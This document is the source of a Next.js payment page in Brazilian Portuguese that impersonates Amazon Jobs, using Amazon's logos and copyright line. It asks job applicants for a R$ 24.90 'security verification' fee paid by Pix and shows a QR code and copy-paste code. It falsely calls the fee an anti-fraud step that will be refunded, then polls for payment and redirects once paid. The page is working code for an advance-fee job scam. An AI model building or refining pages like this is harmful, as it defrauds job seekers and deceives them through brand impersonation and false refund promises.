"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import "./pagamento.css";

export default function Pagamento() {
  const router = useRouter();
  const [copied, setCopied] = useState(false);
  const [qrBase64, setQrBase64] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string>("");
  const [status, setStatus] = useState<string>("pending");
  const [externalId, setExternalId] = useState<string | null>(null);

  // 🔹 Recupera os dados salvos ao criar o PIX
  useEffect(() => {
    const saved = localStorage.getItem("pixCheckout");
    if (saved) {
      const data = JSON.parse(saved);
      setQrBase64(data.qrBase64);
      setPixCode(data.brcode);
      setExternalId(data.id); // importante pro status
    }
  }, []);
  // 🔄 Checagem do status a cada 5 segundos (igual ao PixPage)
  useEffect(() => {
    if (!externalId) return;

    const statusInterval = setInterval(async () => {
      try {
        const r = await fetch(`/api/checkout/status/${externalId}`);
        const json = await r.json();

        if (json.status && json.status === "paid") {
          setStatus("paid");
          clearInterval(statusInterval);

          // 🚀 Redireciona pra sucesso (ou upsell, se quiser)
          router.push("/sucesso");
        }

        if (json.status === "not_found") {
          console.log("⚠️ Transação ainda não registrada no backend");
        }
      } catch (err) {
        console.error("❌ Erro ao verificar status:", err);
      }
    }, 5000);

    return () => {
      clearInterval(statusInterval);
    };
  }, [externalId, router]);


  const handleCopy = () => {
    if (!pixCode) return;
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  return (
    <main className="pagamento">
      <header>
        <div className="navbar">
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>

          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      <section className="pagamento-box">
        <h1>Verificação de Segurança</h1>
        <p>
          Para protegermos seu cadastro e garantir a titularidade, solicitamos
          uma <b>taxa única de R$ 24,90</b>.
        </p>
        <p>
          Esse valor não é um custo de contratação. É apenas um{" "}
          <b>procedimento de verificação antifraude</b>. Após a análise, o valor
          é <b>estornado</b>.
        </p>

        <div className="pagamento-card">
          <h2>Método de Pagamento</h2>
          <p>
            Escaneie o QR Code Pix abaixo ou copie o código Pix Copia e Cola:
          </p>

          {/* QR Code dinâmico */}
          <div className="qr-container">
            {qrBase64 ? (
              <img
                src={`data:image/png;base64,${qrBase64}`}
                alt="QR Code Pix"
                width={220}
                height={220}
              />
            ) : (
              <p>Gerando QR Code...</p>
            )}
          </div>

          {/* Pix Copia e Cola */}
          <div className="pix-box">
            <p className="pix-label">Pix Copia e Cola:</p>
            <textarea
              className="pix-input"
              readOnly
              value={pixCode || "Carregando..."}
            ></textarea>
            <button
              onClick={handleCopy}
              className="btn-copiar"
              disabled={!pixCode}
            >
              {copied ? "Copiado!" : "Copiar"}
            </button>
          </div>

       
        </div>
      </section>

      <footer className="footer">
        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li>
                <a href="#">
                  Oportunidades em Centros de Distribuição e Estações de Entrega
                </a>
              </li>
              <li>
                <a href="#">Empregos de atendimento ao cliente</a>
              </li>
              <li>
                <a href="#">Procura de emprego</a>
              </li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li>
                <a href="#">Perguntas Frequentes</a>
              </li>
              <li>
                <a href="#">Fale Conosco</a>
              </li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado
            e inclusivo.
          </p>
          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
